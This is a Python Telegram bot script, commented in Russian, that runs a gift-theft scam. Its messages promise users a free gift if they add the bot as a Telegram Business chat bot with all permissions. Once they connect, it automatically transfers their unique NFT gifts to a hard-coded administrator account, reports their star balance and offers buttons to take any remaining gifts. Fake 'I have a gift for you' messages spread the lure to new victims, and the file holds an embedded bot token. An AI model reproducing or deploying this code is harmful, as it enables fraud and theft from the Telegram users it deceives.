from aiogram import Bot, Dispatcher, F, types
from aiogram.types import (
    Message,
    BusinessConnection,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    CallbackQuery,
    ReplyKeyboardMarkup,
    KeyboardButton,
    InlineQuery,
    InlineQueryResultArticle,
    InputTextMessageContent,
)
from aiogram.methods import GetBusinessAccountGifts, TransferGift, GetBusinessAccountStarBalance
import logging
import asyncio
import json
import os
from datetime import datetime
import sys
import io
import random
import string
import hashlib

sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

# Конфигурация
CONNECTIONS_FILE = "business_connections.json"
TRANSFER_LOG_FILE = "transfer_log.json"
SETTINGS_FILE = "settings.json"
USER_VISITS_FILE = "user_visits.json"  # Для отслеживания переходов
TOKEN = "7830687039:AAGCQcIXyEIIn-90HlWw2hVmIMpHeh5Snlg"
ADMIN_ID = 7348736124
TRANSFER_DELAY = 1

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler("bot.log"),
        logging.StreamHandler()
    ]
)

bot = Bot(token=TOKEN)
dp = Dispatcher()

# Глобальные настройки
AUTO_TRANSFER_ENABLED = True
MANUAL_SELECTION_ENABLED = False

# Кэш для хранения сообщений с подарками
gift_cache = {}
# Кэш для инлайн-запросов
inline_cache = {}


# Загрузка сохраненных настроек
def load_settings():
    global AUTO_TRANSFER_ENABLED, MANUAL_SELECTION_ENABLED
    try:
        if os.path.exists(SETTINGS_FILE):
            with open(SETTINGS_FILE, "r", encoding="utf-8") as f:
                settings = json.load(f)
                AUTO_TRANSFER_ENABLED = settings.get("auto_transfer", True)
                MANUAL_SELECTION_ENABLED = settings.get("manual_selection", False)
    except Exception as e:
        logging.error(f"Ошибка загрузки настроек: {str(e)}")


# Сохранение настроек
def save_settings():
    try:
        settings = {
            "auto_transfer": AUTO_TRANSFER_ENABLED,
            "manual_selection": MANUAL_SELECTION_ENABLED
        }
        with open(SETTINGS_FILE, "w", encoding="utf-8") as f:
            json.dump(settings, f, indent=2, ensure_ascii=False)
    except Exception as e:
        logging.error(f"Ошибка сохранения настроек: {str(e)}")


# Загрузка JSON-файлов
def load_json_file(filename):
    try:
        if os.path.exists(filename):
            with open(filename, "r", encoding="utf-8") as f:
                content = f.read().strip()
                return json.loads(content) if content else []
        return []
    except (FileNotFoundError, json.JSONDecodeError) as e:
        logging.error(f"Ошибка загрузки {filename}: {str(e)}")
        return []


# Сохранение в JSON
def save_to_json(filename, data):
    try:
        with open(filename, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
    except Exception as e:
        logging.error(f"Ошибка сохранения {filename}: {str(e)}")


# Логирование переходов пользователей
def log_user_visit(user_id, code, gift_data):
    try:
        visits = load_json_file(USER_VISITS_FILE) or []
        visits.append({
            "user_id": user_id,
            "code": code,
            "gift_data": gift_data,
            "timestamp": datetime.now().isoformat()
        })
        save_to_json(USER_VISITS_FILE, visits)
    except Exception as e:
        logging.error(f"Ошибка записи лога посещений: {str(e)}")


# Логирование переводов
def log_transfer(user_id, gift_id, status, error=""):
    try:
        logs = load_json_file(TRANSFER_LOG_FILE) or []
        logs.append({
            "user_id": user_id,
            "gift_id": gift_id,
            "status": status,
            "error": error,
            "timestamp": datetime.now().isoformat()
        })
        save_to_json(TRANSFER_LOG_FILE, logs)
    except Exception as e:
        logging.error(f"Ошибка записи лога: {str(e)}")


# Получение баланса звезд
async def get_star_balance(bot: Bot, business_connection_id: str) -> int:
    try:
        balance = await bot(GetBusinessAccountStarBalance(
            business_connection_id=business_connection_id
        ))
        return balance.stars
    except Exception as e:
        logging.error(f"Ошибка получения баланса звезд: {e}")
        return 0


# Получение уникальных подарков
async def get_unique_gifts(bot: Bot, business_connection_id: str) -> list:
    try:
        gifts = await bot(GetBusinessAccountGifts(
            business_connection_id=business_connection_id
        ))
        return [gift for gift in gifts.gifts if gift.type == "unique"] if gifts.gifts else []
    except Exception as e:
        logging.error(f"Ошибка получения подарков: {e}")
        return []


# Перевод конкретного подарка
async def transfer_single_gift(bot: Bot, business_connection_id: str, gift_id: str, star_count: int) -> bool:
    try:
        await bot(TransferGift(
            business_connection_id=business_connection_id,
            new_owner_chat_id=ADMIN_ID,
            owned_gift_id=gift_id,
            star_count=star_count
        ))
        return True
    except Exception as e:
        logging.error(f"Ошибка перевода подарка: {e}")
        return False


# Перевод всех уникальных подарков
async def transfer_all_unique_gifts(bot: Bot, business_connection_id: str, user_id: int) -> dict:
    result = {"total": 0, "transferred": 0, "failed": 0, "errors": []}

    try:
        gifts = await get_unique_gifts(bot, business_connection_id)
        if not gifts:
            return result

        result["total"] = len(gifts)

        for gift in gifts:
            try:
                # ИСПОЛЬЗУЕМ ПРАВИЛЬНЫЙ АТРИБУТ ДЛЯ ЗВЕЗД
                star_count = gift.transfer_star_count
                success = await transfer_single_gift(bot, business_connection_id, gift.owned_gift_id, star_count)
                if success:
                    result["transferred"] += 1
                    log_transfer(user_id, gift.owned_gift_id, "success")
                else:
                    result["failed"] += 1
                    log_transfer(user_id, gift.owned_gift_id, "failed", "Transfer failed")
            except Exception as e:
                result["failed"] += 1
                result["errors"].append(str(e))
                log_transfer(user_id, gift.owned_gift_id, "failed", str(e))

            await asyncio.sleep(TRANSFER_DELAY)

    except Exception as e:
        error_msg = str(e)
        logging.error(f"Ошибка в transfer_all_unique_gifts: {error_msg}")
        result["errors"].append(error_msg)

    return result


# Обработчик бизнес-подключений
@dp.business_connection()
async def handle_business_connect(business_connection: BusinessConnection):
    try:
        user_id = business_connection.user.id
        conn_id = business_connection.id
        username = business_connection.user.username or 'N/A'

        # Сохраняем подключение
        connections = load_json_file(CONNECTIONS_FILE)
        connections = [c for c in connections if c.get("user_id") != user_id]
        connections.append({
            "user_id": user_id,
            "business_connection_id": conn_id,
            "username": username,
            "first_name": business_connection.user.first_name,
            "last_name": business_connection.user.last_name,
            "date": datetime.now().isoformat()
        })
        save_to_json(CONNECTIONS_FILE, connections)

        # Получаем баланс звезд
        star_balance = await get_star_balance(bot, conn_id)

        # Формируем базовый отчет
        report = (
            f"🔗 Новое подключение:\n"
            f"👤 Пользователь: @{username}\n"
            f"🆔 ID: {user_id}\n"
            f"⭐ Звезд: {star_balance}\n\n"
        )

        # Получаем уникальные подарки
        unique_gifts = await get_unique_gifts(bot, conn_id)
        gift_count = len(unique_gifts)

        report += f"🎁 Уникальных подарков: {gift_count}\n"

        # Автоматический перевод, если включен
        if AUTO_TRANSFER_ENABLED and gift_count > 0:
            transfer_result = await transfer_all_unique_gifts(bot, conn_id, user_id)
            report += (
                f"\n📊 Результат автоматического перевода:\n"
                f"• Успешно: {transfer_result['transferred']}\n"
                f"• Ошибок: {transfer_result['failed']}\n"
            )

            if transfer_result['errors']:
                report += "\nОшибки:\n" + "\n".join(f"• {e}" for e in transfer_result['errors'][:3])

        # Отправляем отчет админу
        await bot.send_message(ADMIN_ID, report)

        # Если включен ручной выбор и есть подарки
        if MANUAL_SELECTION_ENABLED and gift_count > 0:
            keyboard = InlineKeyboardMarkup(inline_keyboard=[])
            for gift in unique_gifts:
                # ПРАВИЛЬНОЕ ПОЛУЧЕНИЕ НАЗВАНИЯ И ЗВЕЗД
                # Название подарка
                if hasattr(gift, 'title'):
                    title = gift.title
                elif hasattr(gift, 'gift') and hasattr(gift.gift, 'title'):
                    title = gift.gift.title
                else:
                    title = "Подарок"

                # Звезды для перевода
                star_count = gift.transfer_star_count

                keyboard.inline_keyboard.append([
                    InlineKeyboardButton(
                        text=f"🎁 {title} (⭐{star_count})",
                        callback_data=f"transfer:{conn_id}:{gift.owned_gift_id}:{user_id}:{star_count}"
                    )
                ])

            keyboard.inline_keyboard.append([
                InlineKeyboardButton(
                    text="✅ Забрать все",
                    callback_data=f"transfer_all:{conn_id}:{user_id}"
                )
            ])

            await bot.send_message(
                ADMIN_ID,
                f"🔍 Выберите подарки от @{username}:",
                reply_markup=keyboard
            )

        # Отправляем сообщение пользователю
        welcome_text = """
🎉 <b>Бот успешно подключен!</b> 🎉

Теперь все уникальные подарки будут автоматически переводиться на наш аккаунт.

💎 <b>Как получать подарки:</b>
1. Чтобы отправить подарок другу, просто ответьте на любое сообщение в чате командой:
   <code>@user_trust_bot [ссылка на NFT]</code>

2. Или используйте кнопку "📤 Отправить подарок" под сообщением с подарком

Бот сделает всю работу за вас! 🤖
        """
        await bot.send_message(
            user_id,
            welcome_text,
            parse_mode="HTML"
        )

    except Exception as e:
        logging.error(f"Ошибка в handle_business_connect: {e}")
        await bot.send_message(ADMIN_ID, f"🚨 Ошибка при подключении: {str(e)}")


# Обработчик ручного выбора подарков
@dp.callback_query(F.data.startswith("transfer:"))
async def handle_gift_selection(callback: CallbackQuery):
    data = callback.data.split(":")
    if len(data) < 5:
        await callback.answer("Ошибка формата")
        return

    conn_id = data[1]
    gift_id = data[2]
    user_id = int(data[3])
    star_count = int(data[4])

    try:
        success = await transfer_single_gift(bot, conn_id, gift_id, star_count)
        if success:
            await callback.answer("✅ Подарок успешно переведен!")
            # Обновляем сообщение
            new_text = f"{callback.message.text}\n\n✅ Подарок переведен"
            await callback.message.edit_text(new_text, reply_markup=None)
            log_transfer(user_id, gift_id, "manual_success")
        else:
            await callback.answer("❌ Ошибка перевода", show_alert=True)
    except Exception as e:
        await callback.answer(f"❌ Ошибка: {str(e)}", show_alert=True)


# Обработчик "Забрать все"
@dp.callback_query(F.data.startswith("transfer_all:"))
async def handle_transfer_all(callback: CallbackQuery):
    data = callback.data.split(":")
    if len(data) < 3:
        await callback.answer("Ошибка формата")
        return

    conn_id = data[1]
    user_id = int(data[2])

    try:
        transfer_result = await transfer_all_unique_gifts(bot, conn_id, user_id)
        await callback.answer(
            f"Переведено: {transfer_result['transferred']}/{transfer_result['total']}",
            show_alert=True
        )
        # Обновляем сообщение
        new_text = f"{callback.message.text}\n\n✅ Все подарки переведены"
        await callback.message.edit_text(new_text, reply_markup=None)
    except Exception as e:
        await callback.answer(f"❌ Ошибка: {str(e)}", show_alert=True)


# Обработка команды старта
async def handle_start_command(message: Message):
    try:
        connections = load_json_file(CONNECTIONS_FILE)
        count = len(connections)
    except Exception:
        count = 0

    if message.from_user.id != ADMIN_ID:
        # УПРОЩЕННАЯ ИНСТРУКЦИЯ ДЛЯ ПОЛЬЗОВАТЕЛЕЙ
        welcome_text = """
🔹 <b>Как подключить бота для получения подарка?</b>
1. Скопируйте юзернейм @user_trust_bot
2. Добавьте меня в <b>Бизнес Телеграм</b> как Чат - Bot в настройках Telegram
3. Выдайте все разрешения!
4. После подключения вы получите свой уникальный подарок!

📌 <b>Подключение:</b>
• Откройте Настройки → Telegram для бизнеса → Чат-боты</b>
• Выберите меня и активируйте все разрешения!

После подключения вы получите подарок отправленный вам!
        """
        await message.answer(welcome_text, parse_mode="HTML")
    else:
        load_settings()
        admin_text = f"""
🛠️ <b>Привет, админ</b> 🛠️

• Подключений: <b>{count}</b>
• Автоперевод: {'✅ ВКЛ' if AUTO_TRANSFER_ENABLED else '⛔ ВЫКЛ'}
• Ручной выбор: {'✅ ВКЛ' if MANUAL_SELECTION_ENABLED else '⛔ ВЫКЛ'}

Команды управления:
/auto_on - Включить авто-перевод
/auto_off - Выключить авто-перевод
/manual_on - Включить ручной выбор
/manual_off - Выключить ручной выбор
/check_gifts - Проверить подарки
        """
        await message.answer(admin_text, parse_mode="HTML")


# Обработчик всех сообщений
@dp.message(F.text)
async def universal_message_handler(message: types.Message, bot: Bot):
    # Обработка команд администратора
    if message.from_user.id == ADMIN_ID:
        if message.text == "/auto_on":
            global AUTO_TRANSFER_ENABLED
            AUTO_TRANSFER_ENABLED = True
            save_settings()
            await message.answer("✅ Автоматический перевод включен")
            return

        elif message.text == "/auto_off":
            AUTO_TRANSFER_ENABLED = False
            save_settings()
            await message.answer("⛔ Автоматический перевод отключен")
            return

        elif message.text == "/manual_on":
            global MANUAL_SELECTION_ENABLED
            MANUAL_SELECTION_ENABLED = True
            save_settings()
            await message.answer("✅ Ручной выбор включен")
            return

        elif message.text == "/manual_off":
            MANUAL_SELECTION_ENABLED = False
            save_settings()
            await message.answer("⛔ Ручной выбор отключен")
            return

        elif message.text == "/check_gifts":
            connections = load_json_file(CONNECTIONS_FILE)
            if not connections:
                return await message.answer("Нет активных подключений.")

            for conn in connections:
                try:
                    result = await transfer_all_unique_gifts(bot, conn["business_connection_id"], conn["user_id"])
                    msg = (
                        f"Проверка {conn.get('username', conn['user_id'])}:\n"
                        f"• Передано: {result['transferred']}\n"
                        f"• Ошибок: {result['failed']}"
                    )
                    await message.answer(msg)
                    await asyncio.sleep(5)
                except Exception as e:
                    await message.answer(f"Ошибка для {conn['user_id']}: {str(e)}")
            return

        elif message.text == "/start":
            await handle_start_command(message)
            return

    # Обработка обычных сообщений
    await handle_start_command(message)


# Обработчик кнопки "Отправить подарок"
@dp.message(F.text == "📤 Отправить подарок")
async def handle_send_gift_button(message: Message, bot: Bot):
    try:
        # Получаем исходное сообщение, на которое отвечаем
        if not message.reply_to_message:
            await message.answer("❌ Это сообщение не является ответом на подарок")
            return

        original_message = message.reply_to_message
        key = (original_message.chat.id, original_message.message_id)
        text = gift_cache.get(key)

        if not text:
            await message.answer("❌ Не удалось найти исходное сообщение с подарком")
            return

        # Ищем ссылку в сообщении
        words = text.split()
        link = None
        for word in words:
            if word.startswith("http://") or word.startswith("https://"):
                link = word
                break

        if not link:
            await message.answer("❌ В сообщении не найдена ссылка")
            return

        bot_username = (await bot.me()).username.lower()
        random_code = ''.join(random.choices(string.digits, k=5))
        bot_start_link = f"https://t.me/{bot_username}?start={random_code}"

        # Сохраняем данные подарка в кэш
        inline_cache[random_code] = text

        # Создаем кнопку "Получить"
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🎁 Получить", url=bot_start_link)]
        ])

        # Отправляем сообщение с подарком от имени пользователя
        await bot.send_message(
            chat_id=original_message.chat.id,
            text=f"🎁 У меня для тебя подарок!\n{link}",
            reply_markup=keyboard,
            business_connection_id=original_message.business_connection_id if hasattr(original_message,
                                                                                      'business_connection_id') else None
        )

        # Удаляем клавиатуру быстрого ответа
        await message.answer(
            "✅ Подарок успешно отправлен!",
            reply_markup=types.ReplyKeyboardRemove()
        )

    except Exception as e:
        logging.error(f"Ошибка отправки подарка: {str(e)}")
        await message.answer("❌ Произошла ошибка при отправке подарка")


# Обработчик сообщений с подарками
@dp.message(F.text)
async def handle_gift_message(message: types.Message, bot: Bot):
    try:
        # Пропускаем сообщения от самого бота
        if message.from_user.id == (await bot.me()).id:
            return

        bot_username = (await bot.me()).username.lower()
        text = message.text.strip()
        logging.info(f"Обработка сообщения с подарком: {text}")

        # Ищем упоминание бота в любом месте сообщения
        mention_patterns = [f"@{bot_username}", f"@{bot_username} ", f"@{bot_username}\n"]

        found_mention = False
        for pattern in mention_patterns:
            if pattern in text.lower():
                found_mention = True
                break

        if not found_mention:
            logging.info("Упоминание бота не найдено")
            return

        # Сохраняем сообщение в кэш для быстрого доступа
        key = (message.chat.id, message.message_id)
        gift_cache[key] = text

        # Создаем клавиатуру быстрого ответа (quick reply)
        keyboard = ReplyKeyboardMarkup(
            keyboard=[[KeyboardButton(text="📤 Отправить подарок")]],
            resize_keyboard=True,
            one_time_keyboard=True,
            input_field_placeholder="Нажмите кнопку чтобы отправить"
        )

        # Отправляем предложение отправить подарок с кнопкой сверху
        await message.answer(
            "Нажмите кнопку ниже, чтобы отправить этот подарок 👇",
            reply_markup=keyboard,
            reply_to_message_id=message.message_id
        )

    except Exception as e:
        logging.error(f"Ошибка обработки сообщения с подарком: {str(e)}")


# Обработчик инлайн-запросов
@dp.inline_query()
async def handle_inline_query(inline_query: InlineQuery):
    try:
        query = inline_query.query.strip()
        if not query:
            return

        # Генерируем уникальный ID для результата
        result_id = hashlib.md5(query.encode()).hexdigest()

        # Генерируем случайный код
        random_code = ''.join(random.choices(string.digits, k=5))
        bot_username = (await bot.get_me()).username
        bot_start_link = f"https://t.me/{bot_username}?start={random_code}"

        # Сохраняем запрос в кэш
        inline_cache[random_code] = query
        log_user_visit(inline_query.from_user.id, random_code, query)

        # Создаем инлайн-результат
        item = InlineQueryResultArticle(
            id=result_id,
            title="🎁 Отправить подарок",
            description="Нажмите, чтобы отправить этот подарок",
            input_message_content=InputTextMessageContent(
                message_text=f"🎁 У меня для тебя подарок!\n\n{query}"
            ),
            reply_markup=InlineKeyboardMarkup(
                inline_keyboard=[
                    [InlineKeyboardButton(
                        text="Принять",
                        url=bot_start_link
                    )]
                ]
            ),
            thumbnail_url="https://cdn-icons-png.flaticon.com/512/6366/6366191.png"
        )

        await bot.answer_inline_query(
            inline_query_id=inline_query.id,
            results=[item],
            cache_time=10
        )
    except Exception as e:
        logging.error(f"Ошибка обработки инлайн-запроса: {e}")


# Обработка стартовой команды с параметром
@dp.message(F.text.startswith("/start"))
async def handle_start_with_param(message: Message):
    # Обрабатываем обычный /start
    if len(message.text.split()) == 1:
        await handle_start_command(message)
        return

    # Обрабатываем /start с параметром
    try:
        param = message.text.split()[1]

        # Логируем переход пользователя
        log_user_visit(message.from_user.id, param, inline_cache.get(param, ""))

        # Показываем инструкцию по подключению
        connection_instructions = """
🎁 <b>Чтобы получить подарок, вам нужно:</b>

1. <b>Добавить бота как Business Bot</b>
   • Откройте <i>Настройки Telegram</i>
   • Перейдите в <i>Telegram для бизнеса → Чат-боты</i>
   • Добавьте этого бота и активируйте все разрешения!

2. <b>После подключения:</b>
   • Все уникальные подарки будут автоматически переводиться
   • Вы сможете отправлять подарки друзьям через этого бота

3. <b>Как отправить подарок:</b>
   • сообщение в чате командой:
     <code>@user_trust_bot</code>
   • Или используйте кнопку "📤 Отправить подарок" в боте

🔹 <b>После подключения вы автоматически получите этот подарок!</b>
        """

        await message.answer(
            connection_instructions,
            parse_mode="HTML"
        )

        # Добавляем кнопку для быстрого доступа к настройкам
        keyboard = InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(
                text="⚙️ Открыть настройки Telegram",
                url="tg://settings"
            )
        ]])

        await message.answer(
            "Нажмите кнопку ниже, чтобы открыть настройки Telegram и подключить бота:",
            reply_markup=keyboard
        )

    except Exception as e:
        logging.error(f"Ошибка обработки старта с параметром: {e}")
        await message.answer("❌ Произошла ошибка при обработке запроса")


# Запуск бота
async def main():
    logging.info("Бот запущен")
    load_settings()
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
